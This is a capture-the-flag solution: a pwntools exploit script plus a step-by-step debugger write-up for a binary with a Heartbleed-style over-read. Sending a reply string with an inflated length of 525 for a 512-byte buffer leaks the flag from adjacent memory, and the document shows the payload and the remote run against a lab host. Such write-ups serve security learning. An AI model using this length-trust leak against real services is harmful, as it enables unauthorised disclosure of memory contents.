from pwn import *

host = '10.10.0.246'
port = 1234

flag = ''
h = remote(host, port, timeout = None)
payload = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (525) LETTERS'
h.sendline(payload)
m = h.recvline()
print m
flag = m[512:]
print flag
h.close()


'''
BABY Nº2   Heartbleed vulnerability write up 
0x0000000000400fb9 <+91>:	mov    esi,0x487de4
0x0000000000400fbe <+96>:	mov    edi,0x487de6
0x0000000000400fc3 <+101>:	call   0x407d80 <fopen64>
Just before the call to fopen64, the content of that memory address is moved which is the one that contains the string "flag". fopen() function opens the file named by filename and associates a stream with it. This function returns a pointer to the FILE structure associated with the stream.
FILE *fopen(const char *filename, const char *type);

So in register edi we have the argument char *filename which is a pointer.

Now we create a file where the binary is located with the name of "flag", and we put a breakpoint 0x400fc8
Make the jump and that is not equal to zero. Zero means that the name of the file is not the same or can not be opened
0x0000000000400fcc <+110>:	cmp    QWORD PTR [rbp-0x18],0x0
0x0000000000400fd1 <+115>:	jne    0x400fe7 <main+137>

If we delete the file "flag". Do not jump and call the puts() function to print "Could not open the flag." We can see in the
stack as load the string.
We see after the comparison as RAX = 0 and that it does not jump.
$rax   : 0x0
0x400fd1 <main+0>         jne    0x400fe7 <main+137>	NOT taken [Reason: !(!Z)]

The argument that receives puts() is a string:
0x400fd3 <main+0>         mov    edi, 0x487deb
0x400fd8 <main+0>         call   0x408260 <puts>
If we see it is a memory address and it is passed to register EDI:
gef➤  x/xw 0x487deb
0x487deb:	0x6c756f43

That memory address is actually a pointer whose content is 0x6c756f43
If we see it in python, it corresponds to a string in ascii:
>>> "6c756f43".decode("hex")
'luoC

That is, it is the initial of "Coul" which is Could.

Now with the flag file created, we set a breakpoint right in the instruction where it jumps in b * 0x0000000000400fe7
Then if we put a breakpoint just after fgetln() and continue we will ask for an input. We introduce it and then the value of RAX we will have the value of the entered, in this case we introduce in ascii "AAAA"

Right in this instruction:
0x401027 <main+0>         mov    esi, 0x487e04

In register ESI movera the following value: $ rsi: 0x487e04 → 0x524556524553003f ("?"?)
That in ascii is:
>>> "524556524553003f".decode("hex")
'REVRES\x00?'
So, SERVER.

After the call to the following function strtok(), in this instruction the register RSI has the following value:
$rsi   : 0x487e06            →  "SERVER, ARE YOU STILL THERE"

Next it calls a function, and when leaving the function and doing "test eax, eax" does not jump since it is not equal to zero.
0x40104b <main+0>         call   0x4002d0
0x401050 <main+0>         test   eax, eax
0x401052 <main+0>         je     0x401068 <main+266>	NOT taken [Reason: !(Z)]

Maybe it should has jumped? We do not know yet but maybe it is likely that if according to how it works heartbleed.
Effectively, it should have skipped, since the following is moved to EDI register:

$rdi   : 0x487e22            →  "MALFORMED REQUEST"

Call puts and view it by the standard output.
Well, investigating what the strtok() function does, it makes a trozeado of the chain of characters being the tokens and depending on the delimiting characters in a loop, it is printing by the standard output: A basic example taken from here would be this (https: / /www.tutorialspoint.com/c_standard_library/c_function_strtok.htm)

#include <string.h>
#include <stdio.h>

int main () {
   char str[80] = "This is - www.tutorialspoint.com - website";
   const char s[2] = "-";
   char *token;
   
   /* get the first token */
   token = strtok(str, s);
   
   /* walk through other tokens */
   while( token != NULL ) {
      printf( " %s\n", token );
    
      token = strtok(NULL, s);
   }
   
   return(0);
}

OUT:
This is 
  www.tutorialspoint.com 
  website

Well, this binary has five strtok() calls, so the protocol works depending on the tokens that we pass to the server, that is, if we pass the correct string will jump and will not leave the program, easy right? :) This is a theoretical way, now it's time to try it.
We put a breakpoint right in the test instruction after the first strtok.

gef➤  b  *0x0000000000401050
Punto de interrupción 1 at 0x401050
gef➤  r
Starting program: /home/naivenom/Escritorio/baby/xkcd/xkcd 
SERVER, ARE YOU STILL THERE?

Breakpoint 1, 0x0000000000401050 in main ()

$rax   : 0x0               
$rbx   : 0x400250            →  <_init+0> sub rsp, 0x8
$rcx   : 0xffff            
$rdx   : 0x0               
$rsp   : 0x7fffffffe460      →  0x00007fffffffe588  →  0x00007fffffffe7ba  →  "/home/naivenom/Escritorio/baby/xkcd/xkcd"
$rbp   : 0x7fffffffe4a0      →  0x00000000006b3c90  →  0x000000000042e480  →  <__stpcpy_sse2_unaligned+0> mov rcx, rsi
$rsi   : 0x487e06            →  "SERVER, ARE YOU STILL THERE"
$rdi   : 0x6bae10            →  "SERVER, ARE YOU STILL THERE"
$rip   : 0x401050            →  <main+0> test eax, eax
$r8    : 0x6bae10            →  "SERVER, ARE YOU STILL THERE"
$r9    : 0x6b8880            →  0x00000000006b8880  →  [loop detected]
$r10   : 0x22              
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x401840            →  <__libc_csu_init+0> push r14
$r14   : 0x4018d0            →  <__libc_csu_fini+0> push rbx
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$ds: 0x0000  $fs: 0x0000  $cs: 0x0033  $es: 0x0000  $gs: 0x0000  $ss: 0x002b  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffe460│+0x00: 0x00007fffffffe588  →  0x00007fffffffe7ba  →  "/home/naivenom/Escritorio/baby/xkcd/xkcd"	 ← $rsp
0x00007fffffffe468│+0x08: 0x0000000100000001
0x00007fffffffe470│+0x10: 0x000000000000001d
0x00007fffffffe478│+0x18: 0x00000000006bae10  →  "SERVER, ARE YOU STILL THERE"
0x00007fffffffe480│+0x20: 0x00000000006bae10  →  "SERVER, ARE YOU STILL THERE"
0x00007fffffffe488│+0x28: 0x00000000006babd0  →  0x00000000fbad2498
0x00007fffffffe490│+0x30: 0x0000000000000000
0x00007fffffffe498│+0x38: 0x0000000000400250  →  <_init+0> sub rsp, 0x8
──────────────────────────────────────────────────────────────────────────────────────────

Cool EAX register = 0 therefore take the jump, and if we see in the following instruction:
0x401052 <main+0>         je     0x401068 <main+266>	TAKEN [Reason: Z]

If we continue and as we just introduced "SERVER, ARE YOU STILL THERE?" We will see what happens next:
We place another breakpoint right in the following instruction test: 0x401093
$rax   : 0xffffffea        
$rbx   : 0x400250            →  <_init+0> sub rsp, 0x8
$rcx   : 0x6bae2e            →  0x0000000000000000
$rdx   : 0x20              
$rsp   : 0x7fffffffe460      →  0x00007fffffffe588  →  0x00007fffffffe7ba  →  "/home/naivenom/Escritorio/baby/xkcd/xkcd"
$rbp   : 0x7fffffffe4a0      →  0x00000000006b3c90  →  0x000000000042e480  →  <__stpcpy_sse2_unaligned+0> mov rcx, rsi
$rsi   : 0x487e36            →  "IF SO, REPLY"

Bad luck, our next string or token is "IF SO, REPLY" and that we did not introduce it in the fgetln() function, therefore it is not in our chain and the binary when checking it just matches the "test eax, eax" that is not equal to zero so, it will not jump and exit the program using the exit() function:

0x401095 <main+0>         je     0x4010ab <main+333>	NOT taken [Reason: !(Z)]
0x401097 <main+0>         mov    edi, 0x487e22
0x40109c <main+0>         call   0x408260 <puts>
0x4010a1 <main+0>         mov    edi, 0xffffffff
0x4010a6 <main+0>         call   0x406c40 <exit>

Ok then we can already realize that we have to add in our input that we introduce that complete string since the protocol works like this to be able to communicate with the server, that is, we pass the complete string and the server is checking and dividing it by tokens for the verification.

Well, knowing according to the image how it works and that we have to send to the server, we do the following test introducing the following:
SERVER, ARE YOU STILL THERE? IF SO, REPLY "aaaa" (4) LETTERS

We enter the third strtok (). RAX register will has the string that we introduced:
0x4010c1 <main+0>         mov    QWORD PTR [rbp-0x28], rax
0x4010c5 <main+0>         mov    rax, QWORD PTR [rbp-0x28]
0x4010c9 <main+0>         mov    rdi, rax
0x4010cc <main+0>         call   0x417280 <strlen>

In the registers we see: $ rax: 0x6bae3b → 0x3428200061616161 ("aaaa"?)
Now call the strlen() function. The return value stays in RAX register with the value 4 which is the length of our string.
The next function is memcpy(). After the call of the function, a memory address containing the value "(" is moved to ESI, corresponding surely to the character that separates the token and being the first parenthesis of (4).

We continue with the fourth strtok(). Now after the call of the function ESI it is ")" and RDX "4) LETTERS" just without the first parenthesis.
Recalls the fifth strtok() and the return value is stored in RAX register whose value is "4" and RDX register is now "LETTERS". RSI is now worth just the format "%d LETTERS"  where that %d is passed to the integer "4".
Then call scanf (). After the call to strlen () compares two records just coinciding with the entered number and the length of the string, if they are equal, take the jump but exit the program. In this case it jumps since they are equal!

0x40114a <main+0>         call   0x417280 <strlen>
0x40114f <main+0>         cmp    rbx, rax
0x401152 <main+0>         jbe    0x401168 <main+522>	TAKEN [Reason: C || Z]

STACK: 
$rax   : 0x4               
$rbx   : 0x4

If it does not jump, the NICE TRY comes out. If it jumps, the memory address that contains the string "aaaa" is moved to EDI register:

$rdi   : 0x6b7340            →  0x0000000061616161 ("aaaa"?)

gef➤  x/xw 0x6b7340
0x6b7340 <globals>:	0x61616161

0x401168 <main+0>         mov    edi, 0x6b7340
0x40116d <main+0>         call   0x408260 <puts>

In EDI is the globals pointer which is where our string is stored, but just after 512 bytes the leak of the flag is produced, because if we pass now this input:

SERVER, ARE YOU STILL THERE? IF SO, REPLY "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (525) LETTERS

Just like the image hint a string of 512 bytes but then we tell it to show us 525 bytes, BOOM leak of the flag and if we see the value or content of the pointer globals + 512 we see the value of our flag:

gef➤  x/120a 0x6b7340
0x6b7340 <globals>:	0x6161616161616161	0x6161616161616161
0x6b7350 <globals+16>:	0x6161616161616161	0x6161616161616161
0x6b7360 <globals+32>:	0x6161616161616161	0x6161616161616161
0x6b7370 <globals+48>:	0x6161616161616161	0x6161616161616161
0x6b7380 <globals+64>:	0x6161616161616161	0x6161616161616161
.........
0x6b7540 <globals+512>:	0x733168547b727766	0x6c4200726165485f
0x6b7550 <globals+528>:	0xa7d646565	0x0

>>> "733168547b727766".decode("hex")
's1hT{rwf'
>>> "6c4200726165485f".decode("hex")
'lB\x00raeH_'
>>> "7d646565".decode("hex")
'}dee'
>>> 

Finally we run the remote exploit:
MacBook-Pro-de-naivenom:xkcd n4ivenom$ python exploit.py 
[+] Opening connection to 10.10.0.246 on port 1234: Done
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafwr{Th1s_Hear

fwr{Th1s_Hear

[*] Closed connection to 10.10.0.246 port 1234



'''
